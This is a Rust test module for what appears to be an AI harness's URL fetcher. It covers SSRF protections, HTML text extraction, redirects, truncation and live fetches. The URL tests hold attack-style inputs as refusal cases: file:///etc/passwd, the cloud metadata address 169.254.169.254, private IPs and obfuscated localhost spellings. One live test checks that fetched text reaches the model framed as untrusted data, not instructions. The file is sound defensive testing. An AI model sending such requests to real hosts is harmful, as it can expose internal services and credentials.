        for address in allowed {
            let ip: IpAddr = address.parse().expect("test address should parse");
            assert_eq!(
                check_ip(ip),
                Ok(()),
                "{address} should be an acceptable destination"
            );
        }
    }

    #[test]
    fn unrecognised_ipv6_space_fails_closed() {
        // Anything outside global unicast (2000::/3) is refused without needing
        // a rule naming it, which is the point of denying by default.
        let ip: IpAddr = "3fff::1".parse().unwrap();
        assert_eq!(check_ip(ip), Ok(()), "3fff:: is inside 2000::/3");
        let ip: IpAddr = "4000::1".parse().unwrap();
        assert_eq!(check_ip(ip), Err(BlockReason::Reserved));
    }

    // -- URL rules --------------------------------------------------------

    #[test]
    fn only_https_is_accepted() {
        for url in [
            "http://example.com",
            "file:///etc/passwd",
            "ftp://example.com",
            "data:text/plain,hello",
            "gopher://example.com",
        ] {
            let rejection = check_url(url, &strict()).expect_err("should be refused");
            assert!(
                matches!(rejection, Rejection::BadScheme { .. }),
                "{url} should be refused for its scheme, got {rejection:?}"
            );
        }
        assert!(check_url("https://example.com", &strict()).is_ok());
    }

    #[test]
    fn literal_local_addresses_are_refused_in_a_url() {
        for url in [
            "https://127.0.0.1/admin",
            "https://[::1]/admin",
            "https://169.254.169.254/latest/meta-data/",
            "https://[::ffff:169.254.169.254]/",
            "https://192.168.0.1/",
            "https://10.1.2.3:8080/",
        ] {
            let rejection = check_url(url, &strict()).expect_err("should be refused");
            assert!(
                matches!(rejection, Rejection::Blocked { .. }),
                "{url} should be refused as a blocked address, got {rejection:?}"
            );
        }
    }

    #[test]
    fn obfuscated_spellings_of_localhost_are_refused() {
        // The url crate normalises these to 127.0.0.1 before the check sees
        // them, which is exactly why the check runs on the parsed host.
        for url in [
            "https://2130706433/",
            "https://0x7f.0.0.1/",
            "https://0177.0.0.1/",
        ] {
            let rejection = check_url(url, &strict()).expect_err("should be refused");
            assert!(
                matches!(rejection, Rejection::Blocked { .. }),
                "{url} should be refused as a blocked address, got {rejection:?}"
            );
        }
    }

    #[test]
    fn credentials_in_a_url_are_refused() {
        let rejection = check_url("https://user:secret@example.com/", &strict())
            .expect_err("should be refused");
        assert_eq!(rejection, Rejection::CredentialsInUrl);
    }

    #[test]
    fn empty_and_oversized_and_malformed_urls_are_refused() {
        assert_eq!(check_url("   ", &strict()), Err(Rejection::Empty));
        let long = format!("https://example.com/{}", "a".repeat(MAX_URL_BYTES));
        assert!(matches!(
            check_url(&long, &strict()),
            Err(Rejection::TooLong { .. })
        ));
        assert!(matches!(
            check_url("not a url", &strict()),
            Err(Rejection::NotAUrl { .. })
        ));
        // A relative path is not an absolute URL.
        assert!(matches!(
            check_url("/docs/index.html", &strict()),
            Err(Rejection::NotAUrl { .. })
        ));
    }

    #[test]
    fn a_hostname_is_left_for_the_resolver() {
        // No DNS happens here; the address check for a named host runs inside
        // the resolver, where it cannot be raced.
        assert!(check_url("https://example.com/docs", &strict()).is_ok());
        assert!(check_url("https://localhost/", &strict()).is_ok());
    }

    // -- extraction -------------------------------------------------------

    #[test]
    fn non_html_passes_through_untouched() {
        let json = br#"{"name": "value", "n": 1}"#;
        assert_eq!(
            extract_text(Some("application/json"), json),
            r#"{"name": "value", "n": 1}"#
        );
        let markdown = b"# Title\n\n- one\n- two\n";
        assert_eq!(
            extract_text(Some("text/markdown"), markdown),
            "# Title\n\n- one\n- two\n"
        );
        // No content type at all is treated as text rather than guessed at.
        assert_eq!(extract_text(None, b"<p>raw</p>"), "<p>raw</p>");
    }

    #[test]
    fn script_and_style_subtrees_are_dropped_entirely() {
        let html = br#"<html><head><title>T</title></head>
            <body><script>var evil = "click here";</script>
            <style>.a { color: red; }</style>
            <p>Real text</p>
            <noscript>enable js</noscript></body></html>"#;
        let text = extract_text(Some("text/html"), html);
        assert_eq!(text, "Real text");
        assert!(!text.contains("evil"), "script contents leaked: {text:?}");
        assert!(!text.contains("color"), "style contents leaked: {text:?}");
        assert!(!text.contains('T'), "head contents leaked: {text:?}");
    }

    #[test]
    fn block_tags_become_line_breaks() {
        let html = b"<p>One</p><p>Two</p><ul><li>a</li><li>b</li></ul>";
        assert_eq!(extract_text(Some("text/html"), html), "One\nTwo\na\nb");
    }

    #[test]
    fn inline_tags_do_not_break_a_line() {
        let html = b"<p>See the <a href=\"/x\">reference</a> for <em>details</em>.</p>";
        assert_eq!(
            extract_text(Some("text/html"), html),
            "See the reference for details."
        );
    }

    #[test]
    fn entities_are_decoded() {
        let html =
            b"<p>a &amp; b &lt;tag&gt; &quot;q&quot; &#39;s&#39; &nbsp; &#x2014; &hellip;</p>";
        assert_eq!(
            extract_text(Some("text/html"), html),
            "a & b <tag> \"q\" 's' — …"
        );
        // A bare ampersand is not an entity and must survive.
        assert_eq!(
            extract_text(Some("text/html"), b"<p>Tom & Jerry</p>"),
            "Tom & Jerry"
        );
    }

    #[test]
    fn an_ampersand_followed_by_a_multibyte_character_does_not_panic() {
        // Caught by a live fetch of the Rust std docs: the entity scan used to
        // slice at a fixed byte offset, which landed inside the emoji.
        let html = "<p>a & 🔬 b</p>".as_bytes();
        assert_eq!(extract_text(Some("text/html"), html), "a & 🔬 b");
        // The same shape at the very end of the input.
        let html = "<p>&🔬</p>".as_bytes();
        assert_eq!(extract_text(Some("text/html"), html), "&🔬");
    }

    #[test]
    fn comments_and_doctype_are_dropped() {
        let html = b"<!DOCTYPE html><!-- <p>hidden</p> --><p>shown</p>";
        assert_eq!(extract_text(Some("text/html"), html), "shown");
    }

    #[test]
    fn whitespace_is_collapsed() {
        let html = b"<div>\n    lots     of\n\n\n   space\n</div><p></p><p></p><p>end</p>";
        let text = extract_text(Some("text/html"), html);
        assert_eq!(text, "lots of space\nend");
        assert!(!text.contains("\n\n\n"));
    }

    #[test]
    fn a_pre_block_keeps_its_line_breaks_and_indentation() {
        // The case this exists for: a documentation page is mostly read for its
        // examples, and collapsing them onto one line makes them much harder to
        // use. Note the tags *inside* the block are still stripped.
        let html = b"<p>Example:</p><pre><code><span class=\"kw\">fn</span> main() {\n    let x = 1;\n\n    println!(\"{x}\");\n}</code></pre><p>After.</p>";
        assert_eq!(
            extract_text(Some("text/html"), html),
            "Example:\nfn main() {\n    let x = 1;\n\n    println!(\"{x}\");\n}\nAfter."
        );
    }

    #[test]
    fn text_around_a_pre_block_is_still_collapsed() {
        let html = b"<div>\n   lots    of\n   space\n</div><pre>  keep\n    me</pre><div>\n  more   space\n</div>";
        assert_eq!(
            extract_text(Some("text/html"), html),
            "lots of space\n  keep\n    me\nmore space"
        );
    }

    #[test]
    fn a_pre_block_is_trimmed_at_the_ends_only() {
        // The newline browsers ignore after `<pre>` should not become a blank
        // first line, but interior blank lines are content.
        let html = b"<pre>\n\nfirst\n\nlast\n\n</pre>";
        assert_eq!(extract_text(Some("text/html"), html), "first\n\nlast");
    }

    #[test]
    fn a_dropped_subtree_inside_pre_is_still_dropped() {
        let html = b"<pre>keep<script>var x = 1;</script>this</pre>";
        assert_eq!(extract_text(Some("text/html"), html), "keepthis");
    }

    #[test]
    fn an_unclosed_pre_keeps_what_it_collected() {
        let html = b"<p>before</p><pre>a\n  b";
        assert_eq!(extract_text(Some("text/html"), html), "before\na\n  b");
    }

    #[test]
    fn entities_inside_pre_are_decoded() {
        let html = b"<pre>if a &lt; b &amp;&amp; c &gt; d {\n    ok\n}</pre>";
        assert_eq!(
            extract_text(Some("text/html"), html),
            "if a < b && c > d {\n    ok\n}"
        );
    }

    #[test]
    fn an_unclosed_dropped_tag_does_not_leak_its_contents() {
        // A truncated page can end mid-script; better to lose the tail than to
        // hand a model a wall of JavaScript.
        let html = b"<p>before</p><script>var x = 1; // and then the page was cut";
        assert_eq!(extract_text(Some("text/html"), html), "before");
    }

    #[test]
    fn invalid_utf8_degrades_rather_than_failing() {
        let text = extract_text(Some("text/plain"), &[b'a', 0xff, 0xfe, b'b']);
        assert!(text.starts_with('a') && text.ends_with('b'), "got {text:?}");
    }

    // -- transport --------------------------------------------------------

    fn response(status: &str, content_type: &str, body: &str) -> String {
        format!(
            "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        )
    }

    fn redirect(location: &str) -> String {
        format!(
            "HTTP/1.1 302 Found\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        )
    }

    /// Serve one canned response per connection, in order, then stop.
    ///
    /// The socket is bound before the responses are built, so `make` can point a
    /// redirect back at this same server. The thread is deliberately detached
    /// and never joined: a test that stops early (a refused redirect, a
    /// cancellation) leaves it parked in `accept`, and joining would hang the
    /// suite rather than fail it. Every assertion is on the client side anyway.
    fn serve(make: impl FnOnce(&str) -> Vec<String>) -> String {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind test server");
        let addr = listener.local_addr().unwrap();
        let base = format!("http://{addr}");
        let responses = make(&base);
        std::thread::spawn(move || {
            for response in responses {
                let Ok((stream, _)) = listener.accept() else {
                    return;
                };
                let mut reader = BufReader::new(stream);
                // Drain the request head; a GET has no body to follow it.
                loop {
                    let mut line = String::new();
                    if reader.read_line(&mut line).unwrap_or(0) == 0 || line == "\r\n" {
                        break;
                    }
                }
                let mut stream = reader.into_inner();
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        base
    }

    fn never_cancelled() -> impl Future<Output = ()> {
        std::future::pending()
    }

    #[tokio::test]
    async fn a_page_is_fetched_and_extracted() {
        let base = serve(|_| {
            vec![response(
                "200 OK",
                "text/html; charset=utf-8",
                "<html><body><h1>Title</h1><p>Body text</p></body></html>",
            )]
        });
        let fetcher = Fetcher::new(permissive()).unwrap();
        let outcome = fetcher.fetch(&base, never_cancelled()).await;

        assert!(outcome.succeeded(), "expected success, got {outcome:?}");
        assert_eq!(outcome.text, "Title\nBody text");
        assert_eq!(outcome.status, Some(200));
        assert!(!outcome.truncated);
    }

    #[tokio::test]
    async fn a_non_success_status_is_reported_as_data() {
        let base = serve(|_| vec![response("404 Not Found", "text/html", "<p>nope</p>")]);
        let fetcher = Fetcher::new(permissive()).unwrap();
        let outcome = fetcher.fetch(&base, never_cancelled()).await;

        assert!(!outcome.succeeded());
        let error = outcome.error.expect("a failed fetch carries an error");
        assert!(error.contains("404"), "got {error:?}");
    }

    #[tokio::test]
    async fn a_binary_content_type_is_refused() {
        let base = serve(|_| vec![response("200 OK", "image/png", "PNG-ish bytes")]);
        let fetcher = Fetcher::new(permissive()).unwrap();
        let outcome = fetcher.fetch(&base, never_cancelled()).await;

        assert!(!outcome.succeeded());
        let error = outcome.error.expect("a failed fetch carries an error");
        assert!(error.contains("image/png"), "got {error:?}");
    }

    #[tokio::test]
    async fn a_long_body_is_truncated_rather_than_swallowed() {
        let body = "x".repeat(10_000);
        let base = serve(|_| vec![response("200 OK", "text/plain", &body)]);
        let policy = Policy {
            max_bytes: 500,
            ..permissive()
        };
        let fetcher = Fetcher::new(policy).unwrap();
        let outcome = fetcher.fetch(&base, never_cancelled()).await;

        assert!(outcome.succeeded(), "expected success, got {outcome:?}");
        assert!(outcome.truncated, "the cap should be reported");
        assert!(
            outcome.text.len() <= 500,
            "got {} bytes",
            outcome.text.len()
        );
    }

    #[tokio::test]
    async fn a_redirect_is_followed_and_the_landing_url_is_recorded() {
        // `serve` binds before building the responses, so the redirect can name
        // the very port it will be served from.
        let base = serve(|base| {
            vec![
                redirect(&format!("{base}/moved")),
                response("200 OK", "text/plain", "arrived"),
            ]
        });
        let fetcher = Fetcher::new(permissive()).unwrap();
        let outcome = fetcher
            .fetch(&format!("{base}/start"), never_cancelled())
            .await;

        assert!(outcome.succeeded(), "expected success, got {outcome:?}");
        assert_eq!(outcome.text, "arrived");
        let landed = outcome.final_url.expect("a redirect should be recorded");
        assert!(landed.ends_with("/moved"), "got {landed:?}");
    }

    #[tokio::test]
    async fn a_redirect_chain_past_the_cap_is_refused() {
        let base = serve(|_| {
            vec![
                redirect("/one"),
                redirect("/two"),
                redirect("/three"),
                redirect("/four"),
            ]
        });
        let policy = Policy {
            max_redirects: 2,
            ..permissive()
        };
        let fetcher = Fetcher::new(policy).unwrap();
        let outcome = fetcher.fetch(&base, never_cancelled()).await;

        assert!(!outcome.succeeded());
        let error = outcome.error.expect("a failed fetch carries an error");
        assert!(error.contains("redirect"), "got {error:?}");
    }

    #[tokio::test]
    async fn a_refused_url_never_touches_the_network() {
        // Strict policy, so this is decided before a socket is opened; there is
        // no server here at all.
        let fetcher = Fetcher::new(strict()).unwrap();
        for url in ["http://example.com", "https://127.0.0.1/", "https://[::1]/"] {
            let outcome = fetcher.fetch(url, never_cancelled()).await;
            assert!(!outcome.succeeded(), "{url} should be refused");
            assert_eq!(outcome.url, url);
            assert!(outcome.error.is_some());
        }
    }

    #[tokio::test]
    async fn cancelling_stops_the_fetch() {
        // A server that accepts and then never replies.
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind");
        let addr = listener.local_addr().unwrap();
        let server = std::thread::spawn(move || {
            let _keep_open = listener.accept();
            std::thread::sleep(Duration::from_millis(200));
        });

        let fetcher = Fetcher::new(permissive()).unwrap();
        let cancel = tokio::time::sleep(Duration::from_millis(50));
        let started = std::time::Instant::now();
        let outcome = fetcher.fetch(&format!("http://{addr}/"), cancel).await;
        let elapsed = started.elapsed();
        drop(server);

        assert!(!outcome.succeeded());
        assert!(
            elapsed < Duration::from_secs(2),
            "cancel should be prompt, took {elapsed:?}"
        );
    }
}

/// Live tests. Excluded by default; run with:
///
/// ```text
/// cargo test -- --ignored live_ --nocapture
/// ```
#[cfg(test)]
mod live_tests {
    use super::*;

    fn fetcher() -> Fetcher {
        Fetcher::new(Policy::strict(Duration::from_secs(20))).unwrap()
    }

    #[tokio::test]
    #[ignore = "makes a real network request"]
    async fn live_fetches_a_real_documentation_page() {
        let outcome = fetcher()
            .fetch(
                "https://doc.rust-lang.org/std/net/enum.IpAddr.html",
                std::future::pending(),
            )
            .await;

        assert!(outcome.succeeded(), "fetch failed: {:?}", outcome.error);
        assert_eq!(outcome.status, Some(200));
        println!(
            "{} raw bytes -> {} bytes of text",
            outcome.bytes,
            outcome.text.len()
        );
        println!(
            "--- first 400 chars ---\n{}",
            &outcome.text[..floor_char_boundary(&outcome.text, 400)]
        );
        assert!(
            outcome.text.contains("is_loopback"),
            "expected page content to survive extraction"
        );
        assert!(
            !outcome.text.contains("<script"),
            "markup leaked into the text"
        );
        // The code examples are most of why this page is worth fetching, so
        // they must not arrive collapsed onto one line.
        let example = outcome
            .text
            .lines()
            .find(|line| line.contains("use std::net::"))
            .expect("the page's examples should survive");
        println!("--- example line ---\n{example}");
        assert!(
            !example.contains("assert_eq!"),
            "a <pre> block was flattened onto one line: {example:?}"
        );
        assert!(
            outcome
                .text
                .lines()
                .any(|line| line.starts_with("assert_eq!")),
            "the rest of the example should be on its own lines"
        );
    }

    #[tokio::test]
    #[ignore = "makes a real network request"]
    async fn live_fetches_json_untouched() {
        // Small enough to arrive whole; a response past MAX_TEXT_BYTES is
        // truncated mid-token by design, and would not parse.
        let outcome = fetcher()
            .fetch(
                "https://api.github.com/repos/rust-lang/rust/languages",
                std::future::pending(),
            )
            .await;

        assert!(outcome.succeeded(), "fetch failed: {:?}", outcome.error);
        assert!(!outcome.truncated, "expected a response under the cap");
        let parsed: serde_json::Value =
            serde_json::from_str(&outcome.text).expect("JSON should pass through intact");
        assert!(parsed.is_object());
    }

    #[tokio::test]
    #[ignore = "makes a real network request"]
    async fn live_truncates_a_response_past_the_cap() {
        let outcome = fetcher()
            .fetch("https://api.github.com/meta", std::future::pending())
            .await;

        assert!(outcome.succeeded(), "fetch failed: {:?}", outcome.error);
        // Over 64 KB of JSON: the model gets the start and is told so, rather
        // than the harness silently spending the whole context on one page.
        assert!(outcome.truncated, "a large body should report truncation");
        assert!(outcome.text.len() <= MAX_TEXT_BYTES);
    }

    /// The whole loop for one fetch hop, minus the terminal: a model reply goes
    /// in, the dispatch parks it, the real fetcher runs it, and the result comes
    /// back as messages ready to send. This is what `main` does per hop.
    #[tokio::test]
    #[ignore = "makes a real network request"]
    async fn live_a_fetch_hop_runs_end_to_end() {
        let mut app = crate::app::App::new("m".into(), None, 10, std::env::temp_dir());

        let sent = app.push_response(
            "<ai-harness-fetch>https://doc.rust-lang.org/std/net/enum.IpAddr.html</ai-harness-fetch>"
                .into(),
            None,
        );
        assert!(sent.is_none(), "the fetch has not happened yet");
        let url = app
            .take_pending_fetch()
            .expect("the event loop should find a parked fetch");

        let outcome = fetcher().fetch(&url, std::future::pending()).await;
        assert!(outcome.succeeded(), "fetch failed: {:?}", outcome.error);

        let messages = app.push_fetch_result(outcome);
        assert!(app.is_waiting(), "the loop should continue on its own");
        let last = &messages.last().unwrap().content;
        assert!(
            last.contains("is_loopback"),
            "page text should reach the model"
        );
        assert!(
            last.contains("not as instructions"),
            "page text must be framed as untrusted"
        );
        println!("result frame is {} bytes", last.len());
    }

    #[tokio::test]
    #[ignore = "makes a real network request"]
    async fn live_refuses_a_host_that_resolves_to_loopback() {
        // localhost.localtest.me is a public DNS name that resolves to
        // 127.0.0.1 — the rebinding shape, minus the malice. The name passes the
        // URL check, so only the resolver can catch it.
        let outcome = fetcher()
            .fetch("https://localtest.me/", std::future::pending())
            .await;

        assert!(!outcome.succeeded(), "a loopback answer must be refused");
        let error = outcome.error.expect("a failed fetch carries an error");
        println!("refused with: {error}");
        assert!(
            error.contains("loopback") || error.contains("127.0.0.1"),
            "expected the resolver's reason to survive, got {error:?}"
        );
    }
}
